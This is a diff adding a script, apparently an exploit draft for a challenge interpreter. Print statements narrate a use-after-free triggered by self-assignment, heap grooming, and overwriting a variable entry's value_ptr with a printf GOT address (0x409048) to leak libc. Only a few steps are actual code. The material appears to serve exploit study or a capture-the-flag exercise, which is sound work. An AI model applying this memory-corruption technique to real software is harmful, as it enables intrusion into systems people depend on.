@@ -1,0 +1,37 @@
+print("=== Use-After-Free to Corrupt Variable Entry ===");
+
+print("Step 1: Create target variable");
+string target = "target";
+print("Target created");
+
+print("Step 2: Create use-after-free");
+target = target;
+print("target.value_ptr now points to freed memory");
+
+print("Step 3: Heap grooming");
+print("Allocate objects to control what gets allocated in freed memory");
+print("Goal: Make target.value_ptr point to another variable's entry");
+
+string groom1 = "groom1";
+string groom2 = "groom2";
+string groom3 = "groom3";
+print("Created grooming strings");
+
+print("Step 4: Check if target points to variable entry");
+print("If target.value_ptr points to a variable entry:");
+print("  - Offset 0x00-0x1F: Variable name");
+print("  - Offset 0x20: Type");
+print("  - Offset 0x28: value_ptr (what we want to corrupt)");
+
+print("Step 5: Corrupt value_ptr");
+print("If we can write through target, we can corrupt the entry's value_ptr");
+print("Set it to printf@GOT (0x409048)");
+
+print("Step 6: Read libc address");
+print("After corruption, read from the corrupted variable");
+print("int libcprintf = corrupted_var;");
+print("This reads from printf@GOT");
+
+print("Note: This approach avoids bitmap overflow coordinate issues");
+print("Uses use-after-free to directly access variable table");
+
